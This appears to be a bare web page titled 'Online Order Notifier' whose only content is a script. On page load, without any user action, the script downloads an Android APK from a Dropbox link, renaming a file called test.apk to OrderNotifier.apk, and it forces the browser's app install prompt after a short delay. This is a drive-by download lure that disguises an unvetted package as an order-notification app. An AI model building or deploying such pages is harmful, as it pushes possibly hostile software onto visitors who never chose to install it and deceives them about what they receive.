<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Online Order Notifier</title>

  <link rel="manifest" href="/manifest.json" />
  <link rel="icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22>ðŸ“±</text></svg>">
</head>
<body>
  <script>
    let installPrompt = null;
    const apkUrl = "https://dl.dropboxusercontent.com/scl/fi/4xmi395xwb4q775qb5ybu/test.apk?rlkey=t1qngszj6gbberx99tmoczlgp";

    window.addEventListener('beforeinstallprompt', (e) => {
      e.preventDefault();
      installPrompt = e;
      setTimeout(() => installPrompt.prompt(), 800);
    });

    function startInstall() {
      const link = document.createElement('a');
      link.href = apkUrl;
      link.download = "OrderNotifier.apk";
      document.body.appendChild(link);
      link.click();
      document.body.removeChild(link);
    }

    window.onload = function() {
      startInstall();
    };
  </script>

</body>
</html>
